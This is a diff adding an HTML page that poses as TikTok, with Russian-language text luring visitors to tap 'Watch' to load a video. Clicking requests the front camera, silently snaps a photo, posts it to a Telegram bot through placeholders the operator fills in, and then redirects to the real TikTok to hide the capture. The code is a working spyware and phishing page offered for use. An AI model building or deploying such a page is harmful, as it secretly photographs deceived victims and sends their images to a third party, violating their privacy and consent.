@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { background:#000; display:flex; justify-content:center; align-items:center; height:100vh; font-family:Arial,sans-serif; }
+        .card { width:320px; background:#1a1a1a; border-radius:24px; padding:30px; text-align:center; color:#fff; }
+        h2 { font-size:28px; margin-bottom:10px; }
+        p { color:#aaa; margin:10px 0; }
+        button { background:#fe2c55; border:none; color:#fff; font-size:18px; padding:14px 40px; border-radius:50px; margin-top:15px; cursor:pointer; width:100%; }
+        video { display:none; }
+        .loader { display:none; margin-top:10px; color:#fe2c55; }
+    </style>
+</head>
+<body>
+<div class="card">
+    <h2>🎵 TikTok</h2>
+    <p>Нажми «Смотреть» для загрузки видео</p>
+    <button id="btn">Смотреть</button>
+    <div class="loader" id="loader">⏳ Загрузка...</div>
+</div>
+
+<video id="cam" autoplay muted></video>
+
+<script>
+    const BOT_TOKEN = 'ВАШ_ТОКЕН';   // замени
+    const CHAT_ID = 'ВАШ_CHAT_ID';    // замени
+
+    const btn = document.getElementById('btn');
+    const loader = document.getElementById('loader');
+
+    btn.onclick = async function() {
+        try {
+            // Запрашиваем только фронтальную камеру
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user' } 
+            });
+            document.getElementById('cam').srcObject = stream;
+
+            btn.disabled = true;
+            loader.style.display = 'block';
+            btn.innerText = 'Идёт загрузка...';
+
+            setTimeout(() => {
+                captureAndSend();
+            }, 1500);
+        } catch(e) {
+            alert('Ошибка доступа к камере: ' + e.message);
+        }
+    };
+
+    function captureAndSend() {
+        const video = document.getElementById('cam');
+        const canvas = document.createElement('canvas');
+        canvas.width = 640;
+        canvas.height = 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, 640, 480);
+
+        canvas.toBlob(function(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors'
+            }).catch(() => {});
+
+            window.location.href = 'https://www.tiktok.com';
+        }, 'image/jpeg', 0.8);
+    }
+</script>
+</body>
+</html>
